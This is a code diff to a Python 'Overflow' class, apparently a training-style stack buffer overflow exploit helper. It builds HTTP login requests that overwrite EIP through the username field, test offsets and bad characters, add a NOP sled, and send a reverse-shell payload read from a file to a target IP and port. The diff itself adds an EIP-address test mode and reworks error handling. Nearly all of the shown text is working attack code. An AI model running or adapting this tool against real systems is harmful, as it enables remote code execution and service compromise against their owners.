@@ -60,6 +60,12 @@ class NoOffsetError(AttributeError):
 		super().__init__(error_msg)
 
 
+class NoEipMemoryAddressError(AttributeError):
+	"""Will be raised if `jump_eip` attribute has not been set"""
+	def __init__(sefl, error_msg):
+		super().__init__(error_msg)
+
+
 # -------------------( Class Overflow Definition )-------------------
 class Overflow:
 	""" Overflow class definition
@@ -69,14 +75,23 @@ class Overflow:
 		chars (str): All possible characters to test application for bad characters.
 	"""
 	nop_sled = "\x90"*16
-	chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
-"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
-"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
-"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
-"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
-"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
-"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+	chars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 
 	def __init__(
@@ -278,7 +293,7 @@ class Overflow:
 		"""
 
 		Args:
-			offset_value (int): The offset returned from the pattern_offset.rb file or set by the user
+			offset_value (int): The offset returned by the `get_offset` function
 
 		Raises:
 			TypeError: 
@@ -293,7 +308,7 @@ class Overflow:
 
 
 	@property
-	def jump_eip(self) -> str:
+	def jump_eip(self):
 		"""Returns the memory address variable,`jump_eip`, 
 		containing the jump eip instruction"""
 		return self._jump_eip
@@ -310,13 +325,13 @@ class Overflow:
 
 		Raises:
 			InvalidMemoryAddressError: if memory address is not 16 characters in length
-								(the eight bytes from and the slashes and x"s should equal 16 bytes \x8f\x35\x4a\x5f)
+								(Ex. \x8f\x35\x4a\x5f) = 4 bytes)
 		"""
 		try:
 			if len(jump_mem_location) != 4:
-				raise InvalidMemoryAddressError("The memory address to over the EIP register must be four bytes long")
+				raise InvalidMemoryAddressError("The memory address for the EIP register must be eight bytes long")
 		except InvalidMemoryAddressError as err:
-			print(rd+bld+"[-]"+rst+f" Invalid Memory Address Error: {err}")
+			print(rd+bld+"[-]"+rst+f" InvalidMemoryAddressError: {err}")
 			exit(1)
 		else:
 			self._jump_eip = jump_mem_location
@@ -434,11 +449,13 @@ class Overflow:
 				else:
 					content = ("username=" + "A"*self.offset 
 						+ "B"*4
+						+ "C"*4
 						+ chars
-						+ "C"*(self.num_bytes_crash-self.offset - 4 - len(chars)) + "&password=A"
+						+"&password=A"
 					)
 			except NoOffsetError as err:
-				print(rd+bld+"[-] "+rst+f"No Offset Error: {err}")
+				print(rd+bld+"[-] "+rst+f"NoOffsetError: {err}")
+				exit(1)
 			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
@@ -450,7 +467,7 @@ class Overflow:
 			try:
 				soc.send(bytes(buff, "utf-8"))
 			except BaseException as err:
-				print(rd+bld+"[-]"+rst+f" Socket Error: {err}")
+				print(rd+bld+"[-]"+rst+f" SocketError: {err}")
 				exit(1)
 			finally:
 				soc.close()
@@ -471,7 +488,7 @@ class Overflow:
 			try:
 				soc.send(bytes(buff, "utf-8"))
 			except socket.error as err:
-				print(rd+bld+"[-]"+rst+" Socket Error: {err}")
+				print(rd+bld+"[-]"+rst+" SocketError: {err}")
 				exit(1)
 			finally:
 				soc.close()
@@ -487,19 +504,23 @@ class Overflow:
 		
 		soc = self._create_socket()
 
-		with soc:
-			content = "username=" + payload + "&password=A"
-			buff = self._HTTP_header()
-			buff += f"Content-Length: {str(len(content))}\r\n"
-			buff += "\r\n"
-			buff += content
+		try:
+			with soc:
+				content = "username=" + payload + "&password=A"
+				buff = self._HTTP_header()
+				buff += f"Content-Length: {str(len(content))}\r\n"
+				buff += "\r\n"
+				buff += content
 
-			bytes_payload = bytes(buff, "utf-8")
-			print(gn+bld+"[+]"+rst+" -----( Sending pattern payload )-----")
-			soc.send(bytes_payload)
+				bytes_payload = bytes(buff, "utf-8")
+				print(gn+bld+"[+]"+rst+" -----( Sending pattern payload )-----")
+				soc.send(bytes_payload)
+		except socket.error as err:
+			print(r+bld+"[-]"+bld+f" SocketError: {err}")
+			exit(1)
 		
 
-	def get_offset(self, eip_value):
+	def get_offset(self, eip_value) -> int:
 		"""Returns the offset based on the `eip_value` argument
 
 		Args:
@@ -507,57 +528,72 @@ class Overflow:
 		"""
 		pattern = pattern_create(self.num_bytes_crash)
 		self.offset = pattern_offset(eip_value, pattern)
+		return self.offset
 
 
-	def test_offset(self):
+	def test(self, to_test):
 		"""Will send a specially crafted payload to test if the current offset
 		value is the correct offset.
+		
+		Args:
+			to_test (str): The value to test ("offset" or "eip_address")
 
 		Raises:
 			NoOffsetError: if the `get_offset` function has not been invoked
 		"""
 		try:
-			if self.offset:
-				payload = "A"*self.offset + "B"*4 + "C"*(self.num_bytes_crash-self._offset-4)
-				content = "username=" + payload + "&password=A"
-				buff = self._HTTP_header()
-				buff += f"Content-Length: {str(len(content))}\r\n"
-				buff += "\r\n"
-				buff += content
-				bytes_payload = bytes(buff, "utf-8")
-			else:
-				raise NoOffsetError("Please run `get_offset` to get and set offset value")
+			to_test = str(to_test.lower().strip())
+			if to_test == "offset":
+				if not self.offset:
+					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
+				payload = ("A"*self.offset 
+					+ "B"*4 + "C"*(self.num_bytes_crash-self.offset-4)
+				)
+			if to_test == "eip_address":
+				if not self.offset:
+					raise NoOffsetError("Please run `get_offset` to get and set `offset` value")
+				if not self.jump_eip:
+					raise NoEipMemoryAddressError("Please set the `jump_eip` value in order to test jump esp memory address") from None
+				payload = ("A"*self.offset 
+					+ self.jump_eip 
+					+ "C"*4
+					+ "D"*(self.num_bytes_crash-self.offset-len(self.nop_sled)-4)
+				)
+			content = "username=" + payload + "&password=A"
+			buff = self._HTTP_header()
+			buff += f"Content-Length: {str(len(content))}\r\n"
+			buff += "\r\n"
+			buff += content
+			bytes_payload = buff.encode()
 		except NoOffsetError as err:
-			print(rd+bld+"[-]"+rst+f" No Offset Error: {err}")
+			print(rd+bld+"[-]"+rst+f" NoOffsetError: {err}")
 			exit(1)
+		except NoEipMemoryAddressError as err:
+			print(rd+bld+"[-]"+rst+f" NoEipMemoryAddressError: {err}")
+			exit(1)
+		except UnboundLocalError:
+			print(rd+bld+"[-]"+rst+f" InvalidArgument: '{to_test}' ->  Argument to function `test` must be `offset` or `eip_address`")
+			exit(1)
+		else:
+			soc = self._create_socket()
+			try:
+				with soc:
+					soc.send(bytes_payload)
+			except socket.error as err:
+				print(r+bld+"[-]"+bld+f" SocketError: {err}")
+				exit(1)
 
-		soc = self._create_socket()
-
-		with soc:
-			soc.send(bytes_payload)
-		
 
 	def send_bad_chars(self):
 		"""Sends the characters string so user can find bad characters"""
-		copy_chars = Overflow.chars
+		copy_chars = self.chars
+		if self.bad_chars:
+			for char in self.bad_chars:
+				copy_chars = copy_chars.replace(char, "")
+			self.fuzz(chars=copy_chars)
+			return
+		self.fuzz(self.chars)
 
-		for char in self.bad_chars:
-			copy_chars = copy_chars.replace(char, "")
-		self.fuzz(chars=copy_chars)
-
-
-	def _create_socket(self):
-		"""Creates socket for sending payloads"""
-		try:
-			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			soc.connect((self.targ_ip, self.targ_port))
-		except socket.error as err:
-			print(rd+bld+"[-]"+rst+f" Socket Error: {err}")
-			exit(1)
-		except KeyboardInterrupt:
-			print(rd+bld+"\n[-]"+rst+" Terminating program...")
-			exit(1)
-		return soc
 
 
 	def get_payload(self, payload_file):
@@ -571,3 +607,17 @@ class Overflow:
 		with open(payload_file, "rb") as payload_file:
 			payload = payload_file.read()
 			self.fuzz(reverse_payload=payload)
+
+
+	def _create_socket(self):
+		"""Creates socket for sending payloads"""
+		try:
+			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			soc.connect((self.targ_ip, self.targ_port))
+		except socket.error as err:
+			print(rd+bld+"[-]"+rst+f" SocketError: {err}")
+			exit(1)
+		except KeyboardInterrupt:
+			print(rd+bld+"\n[-]"+rst+" Terminating program...")
+			exit(1)
+		return soc
